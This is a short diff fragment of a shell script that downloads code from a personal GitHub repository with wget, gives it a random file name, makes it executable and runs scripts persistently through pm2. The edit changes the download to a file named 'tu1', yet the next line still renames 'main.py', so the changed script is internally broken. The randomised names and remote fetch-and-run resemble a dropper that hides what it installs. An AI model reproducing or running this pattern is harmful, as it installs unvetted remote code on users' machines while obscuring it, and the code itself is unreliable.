@@ -22,7 +22,7 @@ chmod +x $NEW_SH
 npm install -g pm2
 pm2 start $NEW_SH
 
-wget https://raw.githubusercontent.com/hosseinxdns4/fictional-bassoon/main/main.py
+wget https://raw.githubusercontent.com/hosseinxdns4/ideal-winner/main/tu1
 NEW_PY=$(random_name).py
 mv main.py $NEW_PY
 chmod +x $NEW_PY
